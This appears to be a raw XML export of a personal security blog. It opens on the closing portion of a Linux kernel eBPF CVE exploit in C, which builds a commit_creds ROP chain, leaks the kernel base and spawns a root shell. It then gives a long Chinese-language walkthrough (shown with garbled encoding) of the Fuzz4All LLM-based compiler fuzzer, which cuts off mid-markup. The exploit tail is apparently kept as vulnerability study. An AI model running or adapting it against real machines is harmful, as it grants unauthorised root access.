class="hljs-number">0xdeadbeef</span>;<br>        p[i++] = <span class="hljs-number">0xdeadbeef</span>;<br>        p[i++] = POP_RDI_RET+kernel_base;<br>        p[i++] = INIT_CRED+kernel_base;<br>        p[i++] = COMMIT_CREDS+kernel_base;<br>        p[i++] = POP_RCX_RET+kernel_base;<br>        p[i++] = (<span class="hljs-type">size_t</span>)&amp;get_root_shell;<br>        p[i++] = VFORK+kernel_base;       <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv, <span class="hljs-type">char</span>** envp)</span><br>&#123;<br>        init();<br>        leak();<br>        trigger(leak_prog_fd);<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key = <span class="hljs-number">0</span>;<br>        bpf_map_lookup_elem(leak_map_fd, &amp;key, &amp;kernel_base);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_base: %lx\n&quot;</span>, kernel_base);<br><br>        hack();<br>        trigger(hack_prog_fd);<br><br>        <span class="hljs-keyword">if</span>(!getuid())   get_root_shell();<br>        <span class="hljs-keyword">else</span>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Oops...&quot;</span>);<br><br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;&#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CVEs</category>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>cve</tag>
      
      <tag>ebpf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzz4All</title>
    <link href="/2025/01/17/fuzz4all/"/>
    <url>/2025/01/17/fuzz4all/</url>
    
    <content type="html"><![CDATA[<p>éš¾å¾—ç¡ä¸ªå¥½è§‰</p><span id="more"></span><h1 id="Fuzz4All"><a href="#Fuzz4All" class="headerlink" title="Fuzz4All"></a>Fuzz4All</h1><h2 id="fuzz-py"><a href="#fuzz-py" class="headerlink" title="fuzz.py"></a>fuzz.py</h2><h3 id="å‘½ä»¤è¡Œå‚æ•°"><a href="#å‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="å‘½ä»¤è¡Œå‚æ•°"></a>å‘½ä»¤è¡Œå‚æ•°</h3><ul><li>configï¼šé…ç½®æ–‡ä»¶è·¯å¾„ï¼Œåœ¨configè·¯å¾„ä¸‹</li><li>folderï¼šç»“æœå­˜å‚¨è·¯å¾„ï¼Œåœ¨outputsè·¯å¾„ä¸‹</li><li>cpuï¼šå­—é¢æ„æ€</li><li>batch_sizeï¼šå­—é¢æ„æ€</li><li>model_nameï¼šä½¿ç”¨çš„æ¨¡å‹åç§°</li><li>targetï¼šç›®æ ‡ç¼–è¯‘å™¨è·¯å¾„<ul><li>gcc</li><li>g++</li><li>go</li><li>javac</li><li>cvc5ï¼šä¸€ä¸ªçº¦æŸæ±‚è§£å™¨</li><li>qiskitï¼šé‡å­è®¡ç®—</li></ul></li></ul><h3 id="é…ç½®æ–‡ä»¶å‚æ•°"><a href="#é…ç½®æ–‡ä»¶å‚æ•°" class="headerlink" title="é…ç½®æ–‡ä»¶å‚æ•°"></a>é…ç½®æ–‡ä»¶å‚æ•°</h3><ul><li><p>fuzzingï¼šæ•´ä¸ªfuzzæµç¨‹çš„é…ç½®</p><ul><li>target_nameï¼šæµ‹è¯•ç›®æ ‡è·¯å¾„ï¼Œå¯ç”±â€“targetæŒ‡å®š</li><li>output_folderï¼šç»“æœæ–‡ä»¶å¤¹ï¼Œå¯ç”±â€“folderæŒ‡å®š</li><li>numï¼šfuzzè¿­ä»£è½®æ•°</li><li>total_timeï¼šæ€»è®¡fuzzæ—¶é—´ï¼Œå•ä½hour</li><li>log_levelï¼š<ul><li>1ï¼šinfo</li><li>2ï¼štrace</li><li>3ï¼šverbose</li></ul></li><li>otfï¼šå³æ—¶éªŒè¯ï¼Œåœ¨æ¯æ¬¡ç”ŸæˆåéªŒè¯output</li><li>resumeï¼šæ˜¯å¦æ˜¯æ¢å¤æ¨¡å¼</li><li>evaluateï¼šæ˜¯å¦æ˜¯è¯„æµ‹æ¨¡å¼</li><li>use_hand_written_promptï¼šæ˜¯å¦ä½¿ç”¨hand written prompt</li><li>no_input_promptï¼šä¸éœ€è¦è¾“å…¥prompt</li><li>prompt_strategyï¼špromptç­–ç•¥<ul><li>0ï¼šåªä½¿ç”¨trigger_to_generate_inputè¿›è¡Œç”Ÿæˆ</li><li>1ï¼šå˜å¼‚å·²æœ‰ä»£ç </li><li>2ï¼šè¯­ä¹‰ç­‰ä»·å·²æœ‰ä»£ç </li><li>3ï¼šç»“åˆå‰ä¸¤ä¸ªç”Ÿæˆçš„ä»£ç </li></ul></li></ul></li><li><p>targetï¼šç›®æ ‡ç¼–è¯‘å™¨é…ç½®</p><ul><li><p>languageï¼šè¯­è¨€</p></li><li><p>path_documentationï¼šç›®æ ‡è¯­è¨€ç‰¹æ€§æ–‡æ¡£è·¯å¾„</p></li><li><p>path_example_codeï¼šç›®æ ‡è¯­è¨€ç‰¹æ€§ç¤ºä¾‹ä»£ç </p></li><li><p>trigger_to_generate_inputï¼šä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;/* Please create a short program which uses new C features in a complex way */&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>input_hintï¼šä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;#include &lt;stdlib.h&gt;&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>path_hand_written_promptï¼šä¸€äº›å†™å¥½çš„prompt</p></li><li><p>target_stringï¼šéœ€è¦æµ‹è¯•çš„ç›®æ ‡åç§°</p></li></ul></li><li><p>llmï¼šæ¨¡å‹é…ç½®</p><ul><li>temperatureï¼šæ¨¡å‹çš„temperatureï¼ˆé€‰æ‹©æ—¶çš„å†’é™©ç¨‹åº¦æˆ–ç¨³å®šç¨‹åº¦ï¼‰</li><li>batch_sizeï¼šå­—é¢æ„æ€ï¼Œå¯ç”¨â€“batch_sizeæŒ‡å®š</li><li>deviceï¼šå­—é¢æ„æ€ï¼Œå¯ç”¨â€“cpuæŒ‡å®šä¸ºcpu</li><li>model_nameï¼šæ¨¡å‹åï¼Œå¯ç”¨â€“model_nameæŒ‡å®š</li><li>max_lengthï¼šoutputçš„æœ€å¤§é•¿åº¦</li></ul></li></ul><h3 id="fuzz-loopä¸»è¦æµç¨‹"><a href="#fuzz-loopä¸»è¦æµç¨‹" class="headerlink" title="fuzz loopä¸»è¦æµç¨‹"></a>fuzz loopä¸»è¦æµç¨‹</h3><ul><li><p>ç”Ÿæˆåˆå§‹prompt</p><ul><li><p>temperature&#x3D;0ï¼Œgptç”Ÿæˆgreedy_promptï¼Œconfigï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">config = &#123;<br>    <span class="hljs-string">&quot;model&quot;</span>: <span class="hljs-string">&quot;gpt-3.5-turbo&quot;</span>,<br>    <span class="hljs-string">&quot;max_token&quot;</span>: <span class="hljs-number">500</span>,<br>    <span class="hljs-string">&quot;temperature&quot;</span>: <span class="hljs-number">0.0</span>,<span class="hljs-comment"># risk</span><br>    <span class="hljs-string">&quot;message&quot;</span>: [<br>        &#123;<span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: self.AP_SYSTEM_MESSAGE&#125;,<br>        &#123;<span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: message + <span class="hljs-string">&#x27;\n&#x27;</span> + self.AP_INSTRUCTION&#125; <span class="hljs-comment"># messageæ˜¯æ–‡æ¡£</span><br>    ]<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>éªŒè¯æ‰“åˆ†</p></li><li><p>é‡å¤ä¸‰æ¬¡ç”Ÿæˆï¼š</p><ul><li>temperature&#x3D;1ï¼Œgptç”Ÿæˆpromptï¼ŒconfigåŒä¸Š</li><li>éªŒè¯æ‰“åˆ†</li></ul></li></ul><p>é€‰æ‹©åˆ†æ•°æœ€é«˜çš„promptä½œä¸ºinitial_prompt</p></li><li><p>è¿›å…¥loopï¼š</p><ul><li>generate</li><li>é€‰æ‹©å˜å¼‚ç­–ç•¥ï¼Œæ›´æ–°prompt<ul><li>é€‰æ‹©æœ€åä¸€ä¸ªåˆæ³•çš„outputä½œä¸ºnew_code</li><li>ä¸‰ç§å˜å¼‚ç­–ç•¥ï¼š<ul><li>new_code+separator</li><li>å˜å¼‚new_code</li><li>è¯­æ³•ç­‰ä»·new_code</li><li>ç»“åˆnew_codeå’Œprev_example</li></ul></li></ul></li></ul></li></ul><h3 id="cli"><a href="#cli" class="headerlink" title="cli"></a>cli</h3><p>â€“configåŠ è½½é…ç½®æ–‡ä»¶</p><h3 id="main-with-config"><a href="#main-with-config" class="headerlink" title="main_with_config"></a>main_with_config</h3><ul><li><p>è§£æé…ç½®æ–‡ä»¶</p></li><li><p>è°ƒç”¨make_target_with_configåˆ›å»ºTargetå®ä¾‹</p></li><li><p>å¦‚æœä¸æ˜¯evaluateæ¨¡å¼ï¼Œåˆ™å¼€å§‹fuzz</p><ul><li>å¦‚æœä¸æ˜¯resumeæ¨¡å¼åˆ™æ–°å»ºå·¥ä½œæ–‡ä»¶å¤¹</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">fuzz(<br>    target=target,<br>    number_of_iterations=fuzzing[<span class="hljs-string">&quot;num&quot;</span>],<br>    total_time=fuzzing[<span class="hljs-string">&quot;total_time&quot;</span>],<br>    output_folder=folder,<br>    resume=fuzzing[<span class="hljs-string">&quot;resume&quot;</span>],<br>    otf=fuzzing[<span class="hljs-string">&quot;otf&quot;</span>],<br>)<br></code></pre></td></tr></table></figure></li><li><p>å¦‚æœæ˜¯evaluateæ¨¡å¼åˆ™è°ƒç”¨evaluate_allè¿›è¡Œevaluate</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">evaluate_all(target)<br></code></pre></td></tr></table></figure><p>å°±æ˜¯åˆ†åˆ«éªŒè¯ï¼ˆç¼–è¯‘æˆ–è¿è¡Œï¼‰æ¯ä¸ªoutput</p></li></ul><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><ul><li><p>initialize target</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">target.initialize()<br></code></pre></td></tr></table></figure><p><em>initializeè§target&#x2F;target.py</em></p></li><li><p>è¿›å…¥fuzz loopï¼Œè¿­ä»£æ¬¡æ•°number_of_iterations</p><ul><li><p>ä½¿ç”¨self.promptç”Ÿæˆoutputs</p></li><li><p>å¯¹äºæ¯ä¸ªoutputï¼š</p><ul><li>å†™å…¥æ–‡ä»¶</li><li>å¦‚æœè®¾ç½®äº†otfï¼Œåˆ™ï¼š</li><li>è°ƒç”¨validate_individualéªŒè¯outputï¼ˆç¼–è¯‘&#x2F;è¿è¡Œï¼‰</li><li>è°ƒç”¨parse_validation_messageè§£æéªŒè¯ç»“æœä¿¡æ¯ï¼Œè®°å½•è¿›log</li></ul></li><li><p>è°ƒç”¨updateæ›´æ–°target</p><p><em>updateè§target&#x2F;target.py</em></p></li></ul></li></ul><h2 id="make-model-py"><a href="#make-model-py" class="headerlink" title="make_model.py"></a>make_model.py</h2><h3 id="make-model"><a href="#make-model" class="headerlink" title="make_model"></a>make_model</h3><ul><li><p>kwargs_for_modelï¼šå‚æ•°</p><ul><li>model_name</li><li>eos</li><li>device</li><li>max_length</li></ul></li><li><p>åˆ›å»ºStarCoderå®ä¾‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">model_obj = StarCoder(**kwargs_for_model)<br></code></pre></td></tr></table></figure></li><li><p>è¿”å›model_obj</p></li></ul><p>è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">=== Model Config ===<br>model_name: bigcode/starcoderbase-1b<br>model_name: bigcode/starcoderbase-1b<br>eos: [&#x27;/* Please create a short program which uses new C features in a complex way */&#x27;, &#x27;&lt;eom&gt;&#x27;, &#x27;/* Please create a semantically equivalent program to the previous generation */&#x27;, &#x27;/* Please create a mutated program that modifies the previous generation */&#x27;, &#x27;/* Please combine the two previous programs into a single program */&#x27;]<br>device: cuda<br>max_length: 1024<br>model_obj (class name): StarCoder<br>====================<br></code></pre></td></tr></table></figure><h3 id="class-StarCoder"><a href="#class-StarCoder" class="headerlink" title="class StarCoder"></a>class StarCoder</h3><h4 id="init"><a href="#init" class="headerlink" title="__init__"></a>__init__</h4><p>model_nameï¼Œdeviceï¼Œeosï¼Œmax_length</p><ul><li><p>device</p></li><li><p>tokenizer</p></li><li><p>model</p></li><li><p>eosï¼šeos + EOF_STRINGS</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">EOF_STRINGS = [<span class="hljs-string">&quot;&lt;|endoftext|&gt;&quot;</span>, <span class="hljs-string">&quot;###&quot;</span>]<br></code></pre></td></tr></table></figure></li><li><p>prefix_tokenï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;fim_prefix&gt;<br></code></pre></td></tr></table></figure></li><li><p>suffix_tokenï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;fim_suffix&gt;&lt;fim_middle&gt;<br></code></pre></td></tr></table></figure></li><li><p>skip_special_tokensï¼šFalse</p></li></ul><h4 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h4><p>promptç”Ÿæˆä»£ç </p><ul><li><p>inference_modeå…³é—­ä¸€å †ä¸œè¥¿æé«˜é€Ÿåº¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@torch.inference_mode()</span><br></code></pre></td></tr></table></figure></li><li><p>ç»™promptæ·»åŠ å‰åç¼€</p></li><li><p>ç”¨tokenizerè·å–input_tokens</p></li><li><p>EndOfFunctionCriteriaç”¨äºå®æ—¶æ£€æµ‹ç”Ÿæˆæ˜¯å¦å·²ç»“æŸï¼ˆå‡ºç°eosï¼‰ï¼Œæ˜¯åˆ™è®°å½•å»é™¤eosåçš„è¾“å‡ºé•¿åº¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">scores = StoppingCriteriaList(<br>    [<br>        EndOfFunctionCriteria(<br>            start_length=<span class="hljs-built_in">len</span>(input_tokens[<span class="hljs-number">0</span>]),<br>            eos=self.eos,<br>            tokenizer=self.tokenizer,<br>        )<br>    ]<br>)<br></code></pre></td></tr></table></figure></li><li><p>ç”Ÿæˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">raw_outputs = self.model.generate(<br>    input_tokens,<br>    max_length=<span class="hljs-built_in">min</span>(self.max_length, <span class="hljs-built_in">len</span>(input_tokens[<span class="hljs-number">0</span>]) + max_length),<br>    do_sample=<span class="hljs-literal">True</span>,<br>    top_p=<span class="hljs-number">1.0</span>,<br>    temperature=<span class="hljs-built_in">max</span>(temperature, <span class="hljs-number">1e-2</span>),<br>    num_return_sequences=batch_size,<br>    stopping_criteria=scores,<br>    output_scores=<span class="hljs-literal">True</span>,<br>    return_dict_in_generate=<span class="hljs-literal">True</span>,<br>    repetition_penalty=<span class="hljs-number">1.0</span>,<br>    pad_token_id=self.tokenizer.eos_token_id,<br>)<br></code></pre></td></tr></table></figure><ul><li>do_sampleï¼šæ˜¯å¦åœ¨ç”Ÿæˆæ–‡æœ¬æ—¶ä½¿ç”¨é‡‡æ ·ç­–ç•¥ï¼Œå¦‚æœè®¾ç½®ä¸ºFalseï¼Œåˆ™ä½¿ç”¨è´ªå¿ƒç­–ç•¥è¿›è¡Œè§£ç ï¼ˆæ€»æ˜¯é€‰æ‹©æ¦‚ç‡æœ€é«˜çš„ä¸‹ä¸€ä¸ªtokenï¼‰</li><li>top_pï¼šä¿ç•™ç´¯è®¡æ¦‚ç‡è¾¾åˆ°pçš„æœ€å°é›†åˆï¼Œç„¶åä»è¿™ä¸ªé›†åˆä¸­è¿›è¡Œé€‰æ‹©</li><li>num_return_sequencesï¼šè®¾ç½®ç”Ÿæˆå‡ ä¸ªæ–‡æœ¬</li><li>repetition_penaltyï¼šé˜²æ­¢æ–‡æœ¬é‡å¤</li><li>stopping_criteriaï¼šåœæ­¢æ¡ä»¶</li><li>output_scoresï¼šè®©æ¨¡å‹åŒæ—¶è¿”å›è¾“å‡ºå’Œå¯¹åº”çš„åˆ†æ•°</li><li>return_dict_in_generateï¼šæ–¹æ³•ä¼šè¿”å›ä¸€ä¸ªå­—å…¸ï¼Œå…¶ä¸­åŒ…å«ç”Ÿæˆçš„æ–‡æœ¬å’Œå…¶ä»–ç›¸å…³ä¿¡æ¯ï¼Œå¦‚attention masksç­‰</li></ul></li><li><p>å»é™¤æ¯ä¸ªè¾“å‡ºçš„promptéƒ¨åˆ†</p></li><li><p>å»é™¤æ¯ä¸ªè¾“å‡ºçš„eos</p></li></ul><h2 id="make-target-py"><a href="#make-target-py" class="headerlink" title="make_target.py"></a>make_target.py</h2><h3 id="make-target-with-config"><a href="#make-target-with-config" class="headerlink" title="make_target_with_config"></a>make_target_with_config</h3><ul><li><p>target_compat_dictï¼šä¸€ä¸ªå‹ç¼©è¿‡çš„config_dict</p><ul><li>language</li><li>folderï¼šoutput_folder</li><li>bsï¼šbatch_size</li><li>temperature</li><li>device</li><li>model_name</li><li>max_length</li><li>use_hwï¼šuse_hand_written_prompt</li><li>no_input_prompt</li><li>prompt_strategy</li><li>levelï¼šlog_level</li><li>templateï¼šfuzzing_with_config_file</li><li>config_dictï¼šå®Œæ•´çš„config_dictï¼Œè§£æè‡ªé…ç½®æ–‡ä»¶</li><li>target_name</li></ul></li><li><p>æ ¹æ®è¯­è¨€åˆ›å»ºå¯¹åº”Targetå®ä¾‹ï¼Œå¹¶è¿”å›Targetå®ä¾‹ï¼š</p><ul><li>cppï¼šCPPTarget</li><li>cï¼šCTarget</li><li>qiskitï¼šQiskitTarget</li><li>smt2ï¼šSMTTarget</li><li>goï¼šGOTarget</li><li>javaï¼šJAVATarget</li></ul><p><em>Targetè§target&#x2F;target.pyï¼Œå­ç±»è§å­æ–‡ä»¶å¤¹</em></p></li></ul><h2 id="target"><a href="#target" class="headerlink" title="target"></a>target</h2><h3 id="target-py"><a href="#target-py" class="headerlink" title="target.py"></a>target.py</h3><h4 id="class-Target"><a href="#class-Target" class="headerlink" title="class Target"></a>class Target</h4><p>å‚æ•°æ˜¯make_target_with_configä¸­çš„target_compat_dict</p><h5 id="init-1"><a href="#init-1" class="headerlink" title="__init__"></a>__init__</h5><p>languageï¼Œtimeoutï¼Œfolderï¼Œ</p><ul><li><p>language</p></li><li><p>timeout</p></li><li><p>folder</p></li><li><p>CURRENT_TIMEï¼šè·å–ç°åœ¨æ—¶é—´</p></li><li><p>batch_size</p></li><li><p>temperature</p></li><li><p>max_length</p></li><li><p>device</p></li><li><p>model_name</p></li><li><p>modelï¼šNone</p></li><li><p>g_loggerï¼šç»“æœç›®å½•ä¸‹çš„log_generation.txtæ–‡ä»¶ï¼Œæ ¼å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;level.name&#125;</span>] <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><p>ä¾‹å­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">[VERBOSE] #include &lt;stdlib.h&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;inttypes.h&gt;</span><br><br><br>int main(void) &#123;<br>    unsigned i = 1l;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">ifdef UINTPTR_MAX</span><br>    printf(&quot;Unsigned integers are %zu bytes.\n&quot;, sizeof(i));<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">else</span></span><br>    printf(&quot;Unsigned integers are %zd bytes.\n&quot;, sizeof(i)*CHAR_BIT);<br><span class="hljs-meta prompt_">#</span><span class="language-bash">endif</span><br>    i++;<br>    printf(&quot;unsigned i is now %zd bytes long.\n&quot;, sizeof(i))*CHAR_BIT;<br>    printf(&quot;unsigned i is now %&quot; PRIu64 &quot;\n&quot;, i);<br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>v_loggerï¼šç»“æœç›®å½•ä¸‹çš„log_validation.txtæ–‡ä»¶ï¼Œä¾‹å­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">[TRACE] Validating outputs/full_run/gcc/0.fuzz ...<br>[VERBOSE] outputs/full_run/gcc/0.fuzz failed validation with error message: outputs/full_run/gcc/0.fuzz: In function main:<br>outputs/full_run/gcc/0.fuzz:15:62: error: CHAR_BIT undeclared (first use in this function)<br>   15 |     printf(&quot;unsigned i is now %zd bytes long.\n&quot;, sizeof(i))*CHAR_BIT;<br>      |                                                              ^~~~~~~~<br>outputs/full_run/gcc/0.fuzz:5:1: note: CHAR_BIT is defined in header &lt;limits.h&gt;; did you forget to #include &lt;limits.h&gt;?<br>    4 | #include &lt;inttypes.h&gt;<br>  +++ |+#include &lt;limits.h&gt;<br>    5 |<br>outputs/full_run/gcc/0.fuzz:15:62: note: each undeclared identifier is reported only once for each function it appears in<br>   15 |     printf(&quot;unsigned i is now %zd bytes long.\n&quot;, sizeof(i))*CHAR_BIT;<br>      |                                                              ^~~~~~~~<br></code></pre></td></tr></table></figure></li><li><p>m_loggerï¼šç»“æœç›®å½•ä¸‹çš„log.txtæ–‡ä»¶ï¼Œä¾‹å­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[INFO] Loading model ...<br>[INFO] Initializing ... this may take a while ...<br>[INFO] Loading model ...<br>[INFO] Model Loaded<br>[INFO] Use auto-prompting prompt ...<br>[INFO] Initializing ... this may take a while ...<br>[INFO] Loading model ...<br>[INFO] Model Loaded<br>[INFO] Use auto-prompting prompt ...<br>[INFO] Done<br></code></pre></td></tr></table></figure></li><li><p>SYSTEM_MESSAGEï¼šå­ç±»è®¾ç½®</p></li><li><p>AP_SYSTEM_MESSAGEï¼šç³»ç»Ÿæç¤ºprompt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;You are an auto-prompting tool&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>AP_INSTRUCTIONï¼šç”Ÿæˆå‘½ä»¤prompt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;Please summarize the above documentation in a concise manner to describe the usage and &quot;</span><br><span class="hljs-string">&quot;functionality of the target &quot;</span><br></code></pre></td></tr></table></figure></li><li><p>hwï¼šuse_hand_written_prompt</p></li><li><p>no_input_prompt</p></li><li><p>prompt_usedï¼šå­ç±»è®¾ç½®</p></li><li><p>promptï¼šNone</p></li><li><p>initial_promptï¼šNone</p></li><li><p>prev_exampleï¼šNone</p></li><li><p>se_promptï¼šè¯­æ³•ç­‰ä»·æ›¿æ¢å˜å¼‚ç­–ç•¥çš„prompt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">self.se_prompt = self.wrap_in_comment(<br>    <span class="hljs-string">&quot;Please create a semantically equivalent program to the previous &quot;</span><br>    <span class="hljs-string">&quot;generation&quot;</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>m_promptï¼šå˜å¼‚ä¹‹å‰çš„ä»£ç å˜å¼‚ç­–ç•¥çš„prompt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">self.m_prompt = self.wrap_in_comment(<br>    <span class="hljs-string">&quot;Please create a mutated program that modifies the previous generation&quot;</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>c_promptï¼šç»“åˆä¹‹å‰ä¸¤æ®µä»£ç å˜å¼‚ç­–ç•¥çš„prompt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">self.c_prompt = self.wrap_in_comment(<br>    <span class="hljs-string">&quot;Please combine the two previous programs into a single program&quot;</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>p_strategyï¼šprompt_strategy</p></li><li><p>special_eosï¼šNone</p></li><li><p>target_nameï¼štarget</p></li></ul><h5 id="create-prompt-from-config"><a href="#create-prompt-from-config" class="headerlink" title="_create_prompt_from_config"></a>_create_prompt_from_config</h5><p>ä»configè·å–å„ç§prompt</p><ul><li><p>targetï¼šé…ç½®æ–‡ä»¶çš„targetï¼Œæä¾›</p><ul><li>path_documentation</li><li>path_example_code</li><li>trigger_to_generate_input</li><li>input_hint</li><li>path_hand_written_prompt</li><li>target_string</li></ul></li><li><p>trigger_to_generate_inputï¼šè§é…ç½®æ–‡ä»¶</p></li><li><p>documentationï¼šè¯»å–è‡ªpath_documentation</p></li><li><p>example_codeï¼šè¯»å–è‡ªpath_example_code</p></li><li><p>input_hintï¼šè§é…ç½®æ–‡ä»¶</p></li><li><p>hand_written_promptï¼šè¯»å–è‡ªpath_hand_written_prompt</p></li><li><p>target_stringï¼šè§é…ç½®æ–‡ä»¶</p></li><li><p>dict_compatï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">dict_compat = &#123;<br>    <span class="hljs-string">&quot;docstring&quot;</span>: documentation,<br>    <span class="hljs-string">&quot;example_code&quot;</span>: example_code,<br>    <span class="hljs-string">&quot;separator&quot;</span>: trigger_to_generate_input,<br>    <span class="hljs-string">&quot;begin&quot;</span>: input_hint,<br>    <span class="hljs-string">&quot;hw_prompt&quot;</span>: hand_written_prompt,<br>    <span class="hljs-string">&quot;target_api&quot;</span>: target_string,<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>è¿”å›dict_compat</p><h5 id="validate-prompt"><a href="#validate-prompt" class="headerlink" title="validate_prompt"></a>validate_prompt</h5><p>ç»™promptæ‰“åˆ†</p><ul><li><p>è°ƒç”¨generateä½¿ç”¨promptç”Ÿæˆ</p><figure class="highlight 